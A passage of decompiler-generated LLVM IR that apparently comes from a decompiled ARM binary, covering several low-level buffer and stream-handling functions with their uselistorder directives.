dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d38, %dec_label_pc_15d50thread-pre-split.dec_label_pc_15d58_crit_edge
  %v0_15d64 = phi i32 [ %v0_15d64.pre, %dec_label_pc_15d50thread-pre-split.dec_label_pc_15d58_crit_edge ], [ %tmp, %dec_label_pc_15d38 ]
  %v0_15d60 = phi i32 [ %v5_15d70, %dec_label_pc_15d50thread-pre-split.dec_label_pc_15d58_crit_edge ], [ %arg2, %dec_label_pc_15d38 ]
  %v3_15d58 = phi i32 [ %v3_15d58.pre, %dec_label_pc_15d50thread-pre-split.dec_label_pc_15d58_crit_edge ], [ 2147483647, %dec_label_pc_15d38 ]
  %v0_15d5c.in = phi i32 [ %v5_15d74, %dec_label_pc_15d50thread-pre-split.dec_label_pc_15d58_crit_edge ], [ %arg3, %dec_label_pc_15d38 ]
  %v3_15d5c = phi i32 [ %v5_15d74, %dec_label_pc_15d50thread-pre-split.dec_label_pc_15d58_crit_edge ], [ %arg3, %dec_label_pc_15d38 ]
  %v0_15d5c = icmp slt i32 %v0_15d5c.in, 0
  %storemerge = select i1 %v0_15d5c, i32 %v3_15d58, i32 %v3_15d5c
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_15d60, i32* %r1.global-to-local, align 4
  %v1_15d64 = add i32 %v0_15d64, 4
  %v2_15d64 = inttoptr i32 %v1_15d64 to i32*
  %v3_15d64 = load i32, i32* %v2_15d64, align 4
  %v3_15d68 = call i32 @function_10aec(i32 %v3_15d64, i32 %v0_15d60)
  %v1_15d6c = icmp slt i32 %v3_15d68, 0
  %v2_15d6c = icmp eq i32 %v3_15d68, 0
  store i1 %v2_15d6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15d6c, label %dec_label_pc_15d7c, label %dec_label_pc_15d50thread-pre-split

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d58
  %v0_15d7c = load i32, i32* %r4.global-to-local, align 4
  %v1_15d7c = inttoptr i32 %v0_15d7c to i16*
  %v2_15d7c = load i16, i16* %v1_15d7c, align 2
  %v3_15d7c = zext i16 %v2_15d7c to i32
  store i32 %v3_15d7c, i32* %r3.global-to-local, align 4
  %v1_15d80 = add i32 %v0_15d7c, 8
  store i32 %v1_15d80, i32* %r1.global-to-local, align 4
  %v1_15d84 = inttoptr i32 %v1_15d80 to i32*
  %v2_15d84 = load i32, i32* %v1_15d84, align 4
  store i32 %v2_15d84, i32* %r1.global-to-local, align 4
  %v3_15d84 = add i32 %v0_15d7c, 12
  %v4_15d84 = inttoptr i32 %v3_15d84 to i32*
  %v5_15d84 = load i32, i32* %v4_15d84, align 4
  %v1_15d88 = or i32 %v3_15d7c, 8
  store i32 %v1_15d88, i32* %r3.global-to-local, align 4
  %v2_15d8c = sub i32 %v5_15d84, %v2_15d84
  store i32 %v2_15d8c, i32* %r2.global-to-local, align 4
  %v9_15d8c = icmp eq i32 %v5_15d84, %v2_15d84
  store i1 %v9_15d8c, i1* %cpsr_z.global-to-local, align 1
  %v1_15d90 = trunc i32 %v1_15d88 to i16
  store i16 %v1_15d90, i16* %v1_15d7c, align 2
  br i1 %v9_15d8c, label %dec_label_pc_15d7c.dec_label_pc_15ddc_crit_edge, label %dec_label_pc_15d98

dec_label_pc_15d7c.dec_label_pc_15ddc_crit_edge:  ; preds = %dec_label_pc_15d7c
  %v0_15ddc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ddc

dec_label_pc_15d98:                               ; preds = %dec_label_pc_15d7c
  %v0_15d98 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d98 = load i32, i32* %r5.global-to-local, align 4
  %v3_15d98 = icmp ult i32 %v0_15d98, %v1_15d98
  %v9_15d98 = icmp eq i32 %v0_15d98, %v1_15d98
  store i1 %v9_15d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15d98, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_15d98
  store i32 %v1_15d98, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_15d98, %bb23
  %v2_15dac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_15dc0
  %v2_15dac = phi i32 [ %v2_15dac.pre, %.preheader ], [ %v1_15dc4, %dec_label_pc_15dc0 ]
  %v0_15da0 = load i32, i32* %r6.global-to-local, align 4
  %v1_15da0 = inttoptr i32 %v0_15da0 to i8*
  %v2_15da0 = load i8, i8* %v1_15da0, align 1
  %v3_15da0 = zext i8 %v2_15da0 to i32
  store i32 %v3_15da0, i32* %r3.global-to-local, align 4
  %v7_15da4 = icmp eq i8 %v2_15da0, 10
  store i1 %v7_15da4, i1* %cpsr_z.global-to-local, align 1
  %v1_15da8 = add i32 %v0_15da0, 1
  store i32 %v1_15da8, i32* %r6.global-to-local, align 4
  %v3_15dac = inttoptr i32 %v2_15dac to i8*
  store i8 %v2_15da0, i8* %v3_15dac, align 1
  %v0_15db0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15db0, label %dec_label_pc_15db4, label %dec_label_pc_15dc0

dec_label_pc_15db4:                               ; preds = %bb24
  %v0_15db4 = load i32, i32* %r4.global-to-local, align 4
  %v1_15db4 = inttoptr i32 %v0_15db4 to i16*
  %v2_15db4 = load i16, i16* %v1_15db4, align 2
  %v3_15db4 = zext i16 %v2_15db4 to i32
  store i32 %v3_15db4, i32* %r3.global-to-local, align 4
  %v1_15db8 = and i32 %v3_15db4, 256
  %v2_15db8 = icmp eq i32 %v1_15db8, 0
  store i1 %v2_15db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15db8, label %dec_label_pc_15dc0, label %dec_label_pc_15db4.dec_label_pc_15dcc_crit_edge

dec_label_pc_15db4.dec_label_pc_15dcc_crit_edge:  ; preds = %dec_label_pc_15db4
  %v0_15dd0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15dcc

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15db4, %bb24
  %v0_15dc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15dc0 = add i32 %v0_15dc0, -1
  store i32 %v1_15dc0, i32* %r2.global-to-local, align 4
  %v7_15dc0 = icmp eq i32 %v0_15dc0, 1
  store i1 %v7_15dc0, i1* %cpsr_z.global-to-local, align 1
  %v0_15dc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15dc4 = add i32 %v0_15dc4, 1
  store i32 %v1_15dc4, i32* %r1.global-to-local, align 4
  br i1 %v7_15dc0, label %dec_label_pc_15dc0.dec_label_pc_15dcc_crit_edge, label %bb24

dec_label_pc_15dc0.dec_label_pc_15dcc_crit_edge:  ; preds = %dec_label_pc_15dc0
  %v0_15dcc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15dcc

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15db4.dec_label_pc_15dcc_crit_edge, %dec_label_pc_15dc0.dec_label_pc_15dcc_crit_edge
  %v0_15dd0 = phi i32 [ %v1_15dc4, %dec_label_pc_15dc0.dec_label_pc_15dcc_crit_edge ], [ %v0_15dd0.pre, %dec_label_pc_15db4.dec_label_pc_15dcc_crit_edge ]
  %v0_15dcc = phi i32 [ %v0_15dcc.pre, %dec_label_pc_15dc0.dec_label_pc_15dcc_crit_edge ], [ %v0_15db4, %dec_label_pc_15db4.dec_label_pc_15dcc_crit_edge ]
  %v1_15dcc = add i32 %v0_15dcc, 8
  %v2_15dcc = inttoptr i32 %v1_15dcc to i32*
  %v3_15dcc = load i32, i32* %v2_15dcc, align 4
  store i32 %v3_15dcc, i32* %r3.global-to-local, align 4
  %v2_15dd0 = add i32 %v0_15dcc, 16
  %v3_15dd0 = inttoptr i32 %v2_15dd0 to i32*
  store i32 %v0_15dd0, i32* %v3_15dd0, align 4
  %v0_15dd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_15dd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15dd4 = sub i32 %v1_15dd4, %v0_15dd4
  store i32 %v2_15dd4, i32* %r3.global-to-local, align 4
  %v1_15dd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_15dd8 = sub i32 %v1_15dd8, %v2_15dd4
  store i32 %v2_15dd8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ddc

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15d7c.dec_label_pc_15ddc_crit_edge, %dec_label_pc_15dcc
  %v0_15ddc = phi i32 [ %v0_15ddc.pre, %dec_label_pc_15d7c.dec_label_pc_15ddc_crit_edge ], [ %v2_15dd8, %dec_label_pc_15dcc ]
  %v1_15ddc = load i32, i32* @r7, align 4
  %v2_15ddc = sub i32 %v1_15ddc, %v0_15ddc
  br label %dec_label_pc_15de0

dec_label_pc_15d50.dec_label_pc_15de0.loopexit_crit_edge: ; preds = %dec_label_pc_15d50thread-pre-split
  %v0_15de0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15de0

dec_label_pc_15de0:                               ; preds = %dec_label_pc_15d38, %dec_label_pc_15d50.dec_label_pc_15de0.loopexit_crit_edge, %dec_label_pc_15ddc
  %v0_15de0 = phi i32 [ %v2_15ddc, %dec_label_pc_15ddc ], [ %v0_15de0.pre.pre, %dec_label_pc_15d50.dec_label_pc_15de0.loopexit_crit_edge ], [ 0, %dec_label_pc_15d38 ]
  %v2_15de4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15de4, i32* %r4.global-to-local, align 4
  ret i32 %v0_15de0

; uselistorder directives
  uselistorder i32 %v0_15dcc, { 1, 0 }
  uselistorder i32 %v1_15dc4, { 0, 2, 1 }
  uselistorder i32 %v0_15dc0, { 1, 0 }
  uselistorder i32 %v1_15d98, { 0, 2, 1 }
  uselistorder i32 %v0_15d98, { 1, 0 }
  uselistorder i32 %v5_15d84, { 1, 0 }
  uselistorder i32 %v2_15d84, { 1, 0, 2 }
  uselistorder i32 %v3_15d68, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15d60, { 1, 0 }
  uselistorder i32 %v5_15d74, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 5, 4, 6, 7, 8, 0 }
  uselistorder i32 256, { 281, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 273, 282, 279, 280, 283, 36, 38, 37, 39, 272, 40, 41, 42, 0, 278, 1, 43, 44, 45, 46, 48, 49, 50, 47, 52, 53, 54, 51, 55, 276, 56, 284, 285, 57, 58, 59, 287, 60, 61, 62, 63, 64, 65, 66, 67, 68, 71, 70, 69, 72, 277, 288, 286, 73, 74, 75, 76, 78, 77, 79, 80, 81, 83, 82, 84, 85, 2, 94, 90, 95, 91, 86, 87, 88, 96, 92, 97, 93, 89, 98, 99, 100, 101, 102, 112, 113, 107, 114, 108, 103, 104, 109, 115, 110, 116, 111, 105, 106, 117, 118, 119, 120, 125, 123, 121, 126, 124, 122, 127, 128, 130, 132, 133, 131, 129, 134, 274, 289, 135, 137, 136, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 152, 150, 148, 153, 151, 149, 154, 155, 157, 159, 160, 158, 156, 161, 275, 290, 162, 164, 163, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 291, 175, 292, 184, 179, 185, 180, 181, 176, 177, 186, 182, 178, 183, 187, 188, 189, 190, 191, 192, 193, 200, 197, 201, 198, 202, 199, 194, 195, 196, 203, 204, 205, 206, 211, 218, 212, 219, 213, 207, 208, 220, 214, 209, 215, 221, 216, 210, 217, 222, 223, 224, 225, 226, 227, 232, 239, 233, 240, 234, 228, 229, 241, 235, 230, 236, 242, 237, 231, 238, 243, 244, 245, 246, 247, 248, 258, 254, 249, 259, 255, 260, 256, 250, 251, 252, 261, 257, 253, 262, 263, 264, 265, 266, 267, 3, 268, 269, 4, 270, 271 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10aec, { 2, 1, 0 }
  uselistorder i32 4, { 202, 203, 204, 196, 197, 329, 205, 453, 5, 6, 206, 7, 8, 67, 0, 9, 75, 70, 71, 10, 454, 72, 455, 58, 11, 12, 73, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 13, 473, 474, 475, 476, 477, 478, 57, 479, 480, 481, 482, 483, 484, 14, 15, 74, 485, 207, 93, 208, 16, 209, 94, 210, 211, 212, 213, 129, 214, 215, 216, 217, 218, 219, 17, 198, 199, 200, 201, 277, 278, 191, 192, 193, 194, 195, 486, 130, 95, 487, 18, 488, 131, 132, 59, 405, 406, 407, 408, 409, 410, 133, 134, 19, 411, 412, 413, 414, 415, 416, 417, 418, 135, 403, 404, 379, 380, 381, 382, 383, 384, 385, 386, 387, 20, 388, 389, 390, 419, 21, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 136, 137, 138, 434, 435, 438, 441, 436, 437, 96, 139, 439, 50, 440, 442, 443, 444, 446, 140, 23, 22, 445, 141, 142, 143, 246, 144, 51, 24, 25, 279, 280, 281, 282, 283, 26, 284, 447, 448, 190, 27, 28, 97, 76, 60, 247, 104, 248, 249, 250, 29, 251, 77, 98, 99, 235, 236, 242, 243, 100, 220, 221, 222, 223, 224, 225, 101, 226, 227, 228, 102, 229, 103, 230, 231, 232, 233, 234, 237, 238, 239, 240, 241, 244, 245, 53, 52, 252, 68, 253, 30, 254, 31, 55, 54, 256, 32, 255, 257, 258, 263, 105, 265, 106, 266, 107, 267, 268, 264, 259, 108, 260, 261, 262, 449, 269, 66, 65, 64, 270, 109, 33, 34, 35, 36, 37, 271, 62, 61, 272, 63, 110, 273, 274, 275, 111, 276, 285, 286, 145, 287, 288, 289, 146, 147, 1, 112, 290, 78, 291, 292, 293, 148, 294, 295, 149, 150, 2, 113, 296, 79, 297, 80, 298, 299, 300, 301, 151, 302, 303, 152, 153, 304, 305, 114, 306, 3, 307, 81, 308, 115, 309, 310, 311, 312, 154, 313, 314, 155, 156, 315, 316, 116, 317, 4, 318, 82, 319, 117, 320, 38, 330, 331, 332, 157, 333, 334, 335, 336, 158, 159, 118, 337, 119, 339, 83, 340, 341, 342, 160, 343, 344, 161, 162, 345, 84, 346, 85, 347, 348, 349, 350, 163, 351, 352, 164, 165, 121, 353, 120, 354, 86, 355, 87, 356, 357, 358, 359, 360, 361, 123, 362, 124, 363, 166, 364, 56, 365, 167, 168, 125, 366, 122, 367, 88, 368, 89, 369, 370, 371, 169, 372, 373, 170, 171, 374, 126, 375, 90, 376, 172, 173, 174, 377, 378, 127, 91, 175, 176, 177, 450, 451, 128, 92, 178, 39, 391, 179, 40, 392, 180, 41, 393, 181, 42, 394, 182, 43, 395, 183, 69, 44, 396, 397, 184, 45, 398, 185, 46, 399, 186, 47, 400, 187, 48, 401, 188, 49, 402, 452, 321, 322, 323, 324, 325, 326, 327, 189, 328, 338 }
  uselistorder i32 2147483647, { 1, 6, 0, 2, 3, 4, 5 }
  uselistorder i32* @r7, { 3, 36, 37, 25, 26, 27, 28, 29, 30, 31, 32, 35, 4, 38, 39, 40, 5, 41, 42, 43, 19, 44, 45, 6, 46, 47, 48, 49, 50, 51, 7, 52, 53, 54, 55, 56, 57, 33, 34, 313, 314, 202, 203, 276, 277, 24, 315, 316, 317, 322, 323, 8, 58, 59, 110, 9, 111, 112, 113, 0, 114, 115, 278, 279, 280, 281, 282, 283, 284, 285, 286, 259, 260, 261, 262, 263, 264, 287, 288, 289, 290, 291, 292, 293, 294, 10, 295, 296, 297, 298, 299, 300, 301, 80, 81, 116, 117, 82, 83, 302, 303, 304, 305, 127, 128, 129, 130, 131, 136, 137, 138, 139, 140, 132, 133, 134, 135, 141, 142, 143, 144, 145, 146, 249, 250, 320, 321, 84, 85, 86, 87, 182, 183, 318, 319, 210, 211, 147, 148, 204, 205, 118, 119, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 306, 307, 21, 308, 88, 89, 90, 91, 92, 93, 94, 76, 77, 63, 60, 11, 61, 1, 62, 75, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 78, 79, 95, 96, 97, 98, 99, 100, 101, 212, 213, 214, 215, 102, 103, 104, 105, 106, 107, 108, 109, 120, 12, 121, 122, 123, 124, 125, 126, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 22, 177, 178, 179, 180, 181, 184, 23, 185, 186, 187, 188, 189, 216, 217, 218, 219, 220, 221, 222, 223, 13, 224, 225, 226, 227, 228, 229, 230, 231, 232, 2, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 251, 14, 252, 253, 254, 16, 15, 255, 256, 257, 258, 18, 17, 309, 310, 311, 312, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 192, 190, 191, 20, 193, 194, 195, 196, 197, 198, 199, 200, 201, 206, 207, 208, 209 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15de0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15ddc, { 1, 0 }
  uselistorder label %dec_label_pc_15dcc, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15d58, { 1, 0 }
}

define i32 @function_15dec(i32 %arg1) local_unnamed_addr {
dec_label_pc_15dec:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15dec = load i32, i32* @r4, align 4
  store i32 %v3_15dec, i32* %stack_var_-8, align 4
  %v1_15df0 = add i32 %arg1, 8
  %v1_15df4 = inttoptr i32 %v1_15df0 to i32*
  %v2_15df4 = load i32, i32* %v1_15df4, align 4
  %v3_15df4 = add i32 %arg1, 12
  %v4_15df4 = inttoptr i32 %v3_15df4 to i32*
  %v5_15df4 = load i32, i32* %v4_15df4, align 4
  %v2_15df8 = sub i32 %v5_15df4, %v2_15df4
  store i32 %v2_15df8, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_15e00 = inttoptr i32 %arg1 to i16*
  %v4_15e00 = call i32 @function_15ce0(i16* %v3_15e00, i32 %v2_15df4, i32 %v2_15df8)
  %v0_15e04 = load i32, i32* @r4, align 4
  %v1_15e04 = add i32 %v0_15e04, 8
  %v2_15e04 = inttoptr i32 %v1_15e04 to i32*
  %v3_15e04 = load i32, i32* %v2_15e04, align 4
  store i32 %v3_15e04, i32* %r2.global-to-local, align 4
  %v2_15e08 = add i32 %v3_15e04, %v4_15e00
  %v2_15e0c = add i32 %v0_15e04, 20
  %v3_15e0c = inttoptr i32 %v2_15e0c to i32*
  store i32 %v2_15e08, i32* %v3_15e0c, align 4
  %v0_15e10 = load i32, i32* %r2.global-to-local, align 4
  %v1_15e10 = load i32, i32* @r4, align 4
  %v2_15e10 = add i32 %v1_15e10, 16
  %v3_15e10 = inttoptr i32 %v2_15e10 to i32*
  store i32 %v0_15e10, i32* %v3_15e10, align 4
  %v2_15e14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15e14, i32* @r4, align 4
  ret i32 %v4_15e00

; uselistorder directives
  uselistorder i32 %v4_15e00, { 1, 0 }
  uselistorder i32 20, { 30, 113, 3, 114, 115, 1, 116, 31, 7, 32, 33, 34, 35, 29, 44, 45, 25, 26, 27, 28, 117, 8, 118, 108, 109, 110, 2, 46, 9, 47, 48, 0, 36, 38, 4, 40, 10, 41, 24, 39, 37, 42, 43, 49, 50, 11, 51, 52, 53, 54, 55, 56, 57, 58, 12, 59, 60, 61, 62, 63, 64, 13, 65, 66, 14, 67, 68, 69, 70, 15, 71, 72, 16, 73, 74, 75, 76, 78, 17, 79, 80, 81, 82, 83, 84, 18, 85, 86, 87, 88, 19, 20, 89, 5, 90, 21, 91, 92, 93, 94, 6, 95, 22, 96, 97, 98, 99, 100, 23, 101, 102, 103, 104, 105, 106, 107, 111, 112, 77 }
  uselistorder i32 12, { 9, 10, 38, 11, 12, 41, 6, 166, 167, 168, 169, 170, 172, 173, 171, 174, 175, 176, 177, 178, 179, 180, 13, 14, 15, 16, 18, 17, 19, 42, 43, 20, 44, 45, 46, 47, 48, 39, 40, 82, 83, 35, 36, 37, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 3, 120, 121, 122, 123, 124, 21, 125, 143, 22, 23, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 162, 155, 156, 157, 158, 159, 160, 161, 163, 164, 24, 165, 4, 84, 85, 25, 86, 87, 26, 27, 62, 63, 52, 64, 49, 65, 60, 50, 51, 53, 54, 55, 56, 57, 58, 59, 61, 66, 67, 68, 5, 69, 70, 71, 72, 74, 75, 34, 76, 28, 77, 29, 78, 30, 79, 81, 80, 73, 117, 88, 89, 31, 90, 91, 92, 32, 93, 94, 95, 96, 97, 98, 7, 99, 100, 101, 102, 103, 104, 8, 105, 106, 33, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 118, 119, 0, 1, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_15e1c() local_unnamed_addr {
dec_label_pc_15e1c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15e1c = load i32, i32* @r4, align 4
  store i32 %v3_15e1c, i32* %stack_var_-12, align 4
  %v0_15e20 = load i32, i32* @r0, align 4
  %v1_15e20 = inttoptr i32 %v0_15e20 to i16*
  %v2_15e20 = load i16, i16* %v1_15e20, align 2
  %v3_15e20 = zext i16 %v2_15e20 to i32
  store i32 %v3_15e20, i32* %r3.global-to-local, align 4
  %v0_15e24 = load i32, i32* @r1, align 4
  %v2_15e24 = and i32 %v0_15e24, %v3_15e20
  %v4_15e24 = icmp eq i32 %v2_15e24, 0
  store i32 %v0_15e20, i32* @r4, align 4
  br i1 %v4_15e24, label %dec_label_pc_15e34, label %dec_label_pc_15e44

dec_label_pc_15e34:                               ; preds = %dec_label_pc_15e1c
  %v1_15e34 = and i32 %v3_15e20, 2176
  %v2_15e34 = icmp eq i32 %v1_15e34, 0
  br i1 %v2_15e34, label %dec_label_pc_15e3c, label %dec_label_pc_15e50

dec_label_pc_15e3c:                               ; preds = %dec_label_pc_15e34
  %v2_15e3c = or i32 %v0_15e24, %v3_15e20
  store i32 %v2_15e3c, i32* %r3.global-to-local, align 4
  %v1_15e40 = trunc i32 %v2_15e3c to i16
  store i16 %v1_15e40, i16* %v1_15e20, align 2
  %v0_15e44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15e44

dec_label_pc_15e44:                               ; preds = %dec_label_pc_15e1c, %dec_label_pc_15e3c
  %v0_15e44 = phi i32 [ %v0_15e20, %dec_label_pc_15e1c ], [ %v0_15e44.pre, %dec_label_pc_15e3c ]
  %v1_15e44 = inttoptr i32 %v0_15e44 to i16*
  %v2_15e44 = load i16, i16* %v1_15e44, align 2
  %v3_15e44 = zext i16 %v2_15e44 to i32
  store i32 %v3_15e44, i32* %r3.global-to-local, align 4
  %v1_15e48 = and i32 %v3_15e44, 16
  store i32 %v1_15e48, i32* %r5.global-to-local, align 4
  %v2_15e48 = icmp eq i32 %v1_15e48, 0
  br i1 %v2_15e48, label %dec_label_pc_15e70, label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e34, %dec_label_pc_15e44
  %v0_15e50 = call i32 @function_11008()
  store i32 %v0_15e50, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_15e58 = inttoptr i32 %v0_15e50 to i32*
  store i32 9, i32* %v2_15e58, align 4
  br label %dec_label_pc_15e5c

dec_label_pc_15e5c:                               ; preds = %dec_label_pc_15e78, %dec_label_pc_15e50
  %v0_15e5c = load i32, i32* @r4, align 4
  %v1_15e5c = inttoptr i32 %v0_15e5c to i16*
  %v2_15e5c = load i16, i16* %v1_15e5c, align 2
  %v3_15e5c = zext i16 %v2_15e5c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15e64 = or i32 %v3_15e5c, 8
  store i32 %v1_15e64, i32* %r3.global-to-local, align 4
  %v1_15e68 = trunc i32 %v1_15e64 to i16
  store i16 %v1_15e68, i16* %v1_15e5c, align 2
  %v1_15eb0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ea8

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e44
  %v1_15e70 = and i32 %v3_15e44, 64
  %v2_15e70 = icmp eq i32 %v1_15e70, 0
  br i1 %v2_15e70, label %dec_label_pc_15e98, label %dec_label_pc_15e78

dec_label_pc_15e78:                               ; preds = %dec_label_pc_15e70
  %v0_15e78 = load i32, i32* @r0, align 4
  %v1_15e78 = call i32 @function_14a4c(i32 %v0_15e78)
  store i32 %v1_15e78, i32* %r0.global-to-local, align 4
  %v2_15e7c = icmp eq i32 %v1_15e78, 0
  br i1 %v2_15e7c, label %dec_label_pc_15e84, label %dec_label_pc_15e5c

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e78
  %v0_15e84 = load i32, i32* @r4, align 4
  %v1_15e84 = inttoptr i32 %v0_15e84 to i16*
  %v2_15e84 = load i16, i16* %v1_15e84, align 2
  %v3_15e84 = zext i16 %v2_15e84 to i32
  store i32 %v3_15e84, i32* %r3.global-to-local, align 4
  %v1_15e88 = add i32 %v0_15e84, 8
  %v2_15e88 = inttoptr i32 %v1_15e88 to i32*
  %v3_15e88 = load i32, i32* %v2_15e88, align 4
  %v1_15e8c = and i32 %v3_15e84, 65471
  store i32 %v1_15e8c, i32* %r3.global-to-local, align 4
  %v2_15e90 = add i32 %v0_15e84, 28
  %v3_15e90 = inttoptr i32 %v2_15e90 to i32*
  store i32 %v3_15e88, i32* %v3_15e90, align 4
  %v0_15e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_15e94 = trunc i32 %v0_15e94 to i16
  %v2_15e94 = load i32, i32* @r4, align 4
  %v3_15e94 = inttoptr i32 %v2_15e94 to i16*
  store i16 %v1_15e94, i16* %v3_15e94, align 2
  %v0_15e98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15e98

dec_label_pc_15e98:                               ; preds = %dec_label_pc_15e70, %dec_label_pc_15e84
  %v2_15ea0 = phi i32 [ %v0_15e44, %dec_label_pc_15e70 ], [ %v0_15e98.pre, %dec_label_pc_15e84 ]
  %v1_15e98 = inttoptr i32 %v2_15ea0 to i16*
  %v2_15e98 = load i16, i16* %v1_15e98, align 2
  %v3_15e98 = zext i16 %v2_15e98 to i32
  %v1_15e9c = or i32 %v3_15e98, 1
  store i32 %v1_15e9c, i32* %r3.global-to-local, align 4
  %v1_15ea0 = trunc i32 %v1_15e9c to i16
  store i16 %v1_15ea0, i16* %v1_15e98, align 2
  %v0_15ea4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15ea4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ea8

dec_label_pc_15ea8:                               ; preds = %dec_label_pc_15e5c, %dec_label_pc_15e98
  %v1_15eb0 = phi i32 [ %v1_15eb0.pre, %dec_label_pc_15e5c ], [ %v0_15ea4, %dec_label_pc_15e98 ]
  %v2_15eac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15eac, i32* @r4, align 4
  ret i32 %v1_15eb0

; uselistorder directives
  uselistorder i32 %v3_15e20, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 28, { 22, 47, 7, 23, 24, 25, 35, 36, 20, 10, 21, 11, 12, 13, 14, 44, 45, 46, 8, 15, 0, 26, 1, 27, 2, 28, 3, 29, 4, 30, 5, 31, 6, 32, 9, 19, 34, 33, 16, 17, 18, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_14a4c, { 2, 1, 0 }
  uselistorder i32 64, { 13, 14, 15, 16, 20, 9, 10, 11, 12, 52, 17, 18, 19, 21, 22, 6, 23, 24, 25, 0, 26, 27, 28, 1, 29, 30, 31, 2, 32, 33, 34, 7, 35, 36, 37, 3, 38, 39, 40, 41, 42, 4, 43, 44, 45, 46, 47, 5, 48, 49, 50, 8, 51 }
